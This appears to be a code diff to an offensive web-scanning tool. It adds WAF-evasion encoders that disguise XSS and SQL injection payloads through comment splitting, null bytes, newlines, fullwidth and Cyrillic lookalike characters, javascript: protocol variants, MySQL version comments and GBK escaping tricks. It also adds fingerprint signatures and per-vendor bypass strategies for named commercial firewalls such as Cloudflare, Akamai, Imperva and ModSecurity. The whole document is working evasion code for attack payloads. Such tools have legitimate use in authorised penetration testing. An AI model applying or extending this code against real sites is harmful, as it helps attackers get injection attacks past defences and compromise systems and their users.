@@ -121,6 +121,149 @@ class Encoders:
                 result += char
         return result
 
+    # ── New advanced bypass encoders ──────────────────────────────────
+
+    @staticmethod
+    def html_comment_split(payload: str) -> str:
+        """Break tags with HTML comments: <script> -> <scr<!---->ipt>."""
+        replacements = {
+            "script": "scr<!---->ipt",
+            "iframe": "ifr<!---->ame",
+            "object": "obj<!---->ect",
+            "embed": "emb<!---->ed",
+            "onload": "onlo<!---->ad",
+            "onerror": "oner<!---->ror",
+        }
+        result = payload
+        for old, new in replacements.items():
+            result = re.sub(re.escape(old), new, result, flags=re.IGNORECASE, count=1)
+        return result
+
+    @staticmethod
+    def null_byte_tag_split(payload: str) -> str:
+        """Insert null bytes inside tags: <scr%00ipt>."""
+        tags = ["script", "iframe", "object", "embed", "select"]
+        result = payload
+        for tag in tags:
+            if tag.lower() in result.lower():
+                mid = len(tag) // 2
+                pattern = re.compile(re.escape(tag), re.IGNORECASE)
+                match = pattern.search(result)
+                if match:
+                    matched = match.group()
+                    result = result[:match.start()] + matched[:mid] + "%00" + matched[mid:] + result[match.end():]
+                break
+        return result
+
+    @staticmethod
+    def newline_in_tag(payload: str) -> str:
+        """Insert newlines within HTML tags to bypass single-line regex WAFs."""
+        tags = ["script", "iframe", "onload", "onerror"]
+        result = payload
+        for tag in tags:
+            if tag.lower() in result.lower():
+                mid = len(tag) // 2
+                pattern = re.compile(re.escape(tag), re.IGNORECASE)
+                match = pattern.search(result)
+                if match:
+                    matched = match.group()
+                    result = result[:match.start()] + matched[:mid] + "%0a" + matched[mid:] + result[match.end():]
+                break
+        return result
+
+    @staticmethod
+    def fullwidth_unicode(payload: str) -> str:
+        """Replace ASCII with fullwidth Unicode equivalents: <script> -> ＜ｓｃｒｉｐｔ＞."""
+        # Fullwidth mapping for key characters
+        fw_map = {
+            "<": "\uff1c", ">": "\uff1e", "(": "\uff08", ")": "\uff09",
+            "'": "\uff07", '"': "\uff02", "/": "\uff0f", "=": "\uff1d",
+        }
+        # Also map lowercase a-z to fullwidth
+        result = ""
+        for c in payload:
+            if c in fw_map:
+                result += fw_map[c]
+            elif "a" <= c <= "z":
+                result += chr(ord(c) - ord("a") + 0xFF41)
+            elif "A" <= c <= "Z":
+                result += chr(ord(c) - ord("A") + 0xFF21)
+            else:
+                result += c
+        return result
+
+    @staticmethod
+    def unicode_confusables(payload: str) -> str:
+        """Replace letters with visually similar Unicode characters (confusables)."""
+        # Common confusable mappings that some servers normalize back
+        confusables = {
+            "a": "\u0430",  # Cyrillic а
+            "c": "\u0441",  # Cyrillic с
+            "e": "\u0435",  # Cyrillic е
+            "o": "\u043e",  # Cyrillic о
+            "p": "\u0440",  # Cyrillic р
+            "s": "\u0455",  # Cyrillic ѕ
+            "i": "\u0456",  # Cyrillic і
+            "x": "\u0445",  # Cyrillic х
+        }
+        result = ""
+        for c in payload:
+            if c.lower() in confusables and random.random() > 0.5:
+                result += confusables[c.lower()]
+            else:
+                result += c
+        return result
+
+    @staticmethod
+    def js_protocol_variations(payload: str) -> str:
+        """Advanced javascript: protocol bypass tricks."""
+        if "javascript:" not in payload.lower():
+            return payload
+        replacements = [
+            ("javascript:", "java\tscript:"),
+            ("javascript:", "java\x00script:"),
+            ("javascript:", "&#x6a;avascript:"),
+            ("javascript:", "jav&#x61;script:"),
+            ("javascript:", "java%09script:"),
+            ("javascript:", "data:text/html,<script>/**/"),
+        ]
+        old, new = random.choice(replacements)
+        return re.sub(re.escape("javascript:"), new, payload, flags=re.IGNORECASE, count=1)
+
+    @staticmethod
+    def sql_comment_keyword_bypass(payload: str) -> str:
+        """MySQL version-comment bypass: UNION -> /*!50000UNION*/."""
+        keywords = ["UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE"]
+        result = payload
+        for kw in keywords:
+            result = re.sub(
+                rf"\b{kw}\b",
+                f"/*!50000{kw}*/",
+                result,
+                flags=re.IGNORECASE,
+                count=1,
+            )
+        return result
+
+    @staticmethod
+    def hpp_split_payload(payload: str) -> str:
+        """HTTP Parameter Pollution: split payload into duplicate params.
+        Returns a marker string; actual splitting handled at HTTP layer."""
+        if len(payload) > 6:
+            mid = len(payload) // 2
+            return f"HPP_SPLIT:{payload[:mid]}|||{payload[mid:]}"
+        return payload
+
+    @staticmethod
+    def content_type_json(payload: str) -> str:
+        """Hint to send payload as JSON body (many WAFs only inspect form data)."""
+        return f"CT_JSON:{payload}"
+
+    @staticmethod
+    def gbk_encoding(payload: str) -> str:
+        """GBK multibyte encoding trick: ' -> %bf%27 (bypasses addslashes on GBK)."""
+        return payload.replace("'", "%bf%27").replace('"', "%bf%22")
+
     @staticmethod
     def backslash_escape(payload: str) -> str:
         """MySQL backslash escaping bypass."""
@@ -238,7 +381,51 @@ class WAFModule:
                 waf_info.update(result)
                 break
 
+        # Enrich with vendor info and bypass difficulty rating
+        if waf_info["detected"]:
+            waf_name_lower = (waf_info.get("waf_name") or "").lower()
+            waf_info["waf_vendor"] = self._resolve_vendor(waf_name_lower)
+            waf_info["bypass_difficulty"] = self._rate_bypass_difficulty(waf_name_lower)
+
         return waf_info
+
+    @staticmethod
+    def _resolve_vendor(waf_name: str) -> str:
+        """Resolve WAF vendor from detected name."""
+        vendor_map = {
+            "cloudflare": "Cloudflare",
+            "aws": "Amazon", "awselb": "Amazon", "amazon": "Amazon",
+            "akamai": "Akamai",
+            "imperva": "Imperva", "incapsula": "Imperva",
+            "modsecurity": "Trustwave/OWASP", "mod_security": "Trustwave/OWASP",
+            "sucuri": "GoDaddy/Sucuri",
+            "f5": "F5 Networks", "big-ip": "F5 Networks", "bigip": "F5 Networks",
+            "barracuda": "Barracuda Networks",
+            "fortiweb": "Fortinet", "fortinet": "Fortinet",
+            "wallarm": "Wallarm",
+            "wordfence": "Defiant/Wordfence",
+        }
+        for key, vendor in vendor_map.items():
+            if key in waf_name:
+                return vendor
+        return "Unknown"
+
+    @staticmethod
+    def _rate_bypass_difficulty(waf_name: str) -> str:
+        """Rate bypass difficulty for the detected WAF."""
+        hard = ["cloudflare", "akamai", "imperva", "incapsula"]
+        medium = ["modsecurity", "aws", "f5", "big-ip", "fortiweb", "wallarm"]
+        easy = ["sucuri", "barracuda", "wordfence"]
+        for w in hard:
+            if w in waf_name:
+                return "hard"
+        for w in medium:
+            if w in waf_name:
+                return "medium"
+        for w in easy:
+            if w in waf_name:
+                return "easy"
+        return "unknown"
 
     async def _wafw00f_detect(self, domain: str) -> dict:
         """Detect WAF using wafw00f."""
@@ -264,14 +451,18 @@ class WAFModule:
     async def _custom_detect(self, domain: str) -> dict:
         """Custom WAF detection via response analysis."""
         waf_signatures = {
-            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
-            "AWS WAF": ["x-amzn-requestid", "awselb"],
-            "Akamai": ["akamai", "x-akamai"],
-            "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo"],
-            "ModSecurity": ["mod_security", "modsecurity"],
-            "Sucuri": ["sucuri", "x-sucuri"],
-            "F5 BIG-IP": ["bigip", "x-wa-info"],
-            "Barracuda": ["barra_counter_session"],
+            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status", "cf-request-id"],
+            "AWS WAF": ["x-amzn-requestid", "awselb", "x-amz-cf-id", "x-amz-apigw-id"],
+            "Akamai": ["akamai", "x-akamai", "akamai-origin-hop", "x-akamai-transformed"],
+            "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo", "x-cdn=imperva"],
+            "ModSecurity": ["mod_security", "modsecurity", "x-modsecurity"],
+            "Sucuri": ["sucuri", "x-sucuri", "x-sucuri-id", "x-sucuri-cache"],
+            "F5 BIG-IP": ["bigip", "x-wa-info", "bigipserver", "f5-trafficshield"],
+            "Barracuda": ["barra_counter_session", "barracuda"],
+            "FortiWeb": ["fortiwafsid", "x-fw-debug", "fortiweb"],
+            "Wallarm": ["x-wallarm", "wallarm"],
+            "Wordfence": ["wordfence", ".wordfence"],
+            "Edgecast/Verizon": ["x-ec-custom-error", "ecdf", "verizon"],
         }
 
         try:
@@ -340,6 +531,11 @@ class WAFModule:
             self.encoders.js_template_literal,
             self.encoders.overlong_utf8,
             self.encoders.unicode_encode,
+            self.encoders.html_comment_split,
+            self.encoders.null_byte_tag_split,
+            self.encoders.newline_in_tag,
+            self.encoders.fullwidth_unicode,
+            self.encoders.js_protocol_variations,
         ]
 
         # SQLi-specific encoders
@@ -350,6 +546,8 @@ class WAFModule:
             self.encoders.null_byte_inject,
             self.encoders.newline_inject,
             self.encoders.backslash_escape,
+            self.encoders.sql_comment_keyword_bypass,
+            self.encoders.gbk_encoding,
         ]
 
         # SSRF-specific encoders
@@ -363,19 +561,36 @@ class WAFModule:
         # WAF-specific priority adjustments
         if "cloudflare" in waf_name:
             base_encoders = [self.encoders.double_url_encode, self.encoders.unicode_encode,
+                             self.encoders.fullwidth_unicode, self.encoders.unicode_confusables,
                              self.encoders.case_swap, self.encoders.tab_inject]
         elif "akamai" in waf_name:
             base_encoders = [self.encoders.null_byte_inject, self.encoders.double_url_encode,
-                             self.encoders.newline_inject, self.encoders.overlong_utf8]
+                             self.encoders.fullwidth_unicode, self.encoders.newline_inject,
+                             self.encoders.overlong_utf8]
         elif "imperva" in waf_name or "incapsula" in waf_name:
             base_encoders = [self.encoders.chunk_split, self.encoders.double_url_encode,
-                             self.encoders.tab_inject, self.encoders.case_swap]
+                             self.encoders.tab_inject, self.encoders.html_comment_split,
+                             self.encoders.case_swap]
         elif "modsecurity" in waf_name:
             base_encoders = [self.encoders.overlong_utf8, self.encoders.null_byte_inject,
-                             self.encoders.unicode_encode, self.encoders.newline_inject]
+                             self.encoders.unicode_encode, self.encoders.sql_comment_keyword_bypass,
+                             self.encoders.gbk_encoding, self.encoders.newline_inject]
         elif "f5" in waf_name or "big-ip" in waf_name:
             base_encoders = [self.encoders.double_url_encode, self.encoders.tab_inject,
-                             self.encoders.case_swap, self.encoders.chunk_split]
+                             self.encoders.case_swap, self.encoders.chunk_split,
+                             self.encoders.null_byte_tag_split]
+        elif "aws" in waf_name:
+            base_encoders = [self.encoders.double_url_encode, self.encoders.case_swap,
+                             self.encoders.newline_in_tag, self.encoders.fullwidth_unicode,
+                             self.encoders.tab_inject]
+        elif "sucuri" in waf_name:
+            base_encoders = [self.encoders.double_url_encode, self.encoders.overlong_utf8,
+                             self.encoders.html_comment_split, self.encoders.unicode_confusables,
+                             self.encoders.case_swap]
+        elif "barracuda" in waf_name:
+            base_encoders = [self.encoders.null_byte_inject, self.encoders.chunk_split,
+                             self.encoders.double_url_encode, self.encoders.newline_in_tag,
+                             self.encoders.tab_inject]
 
         for payload_data in payloads:
             original = payload_data.get("payload", "")
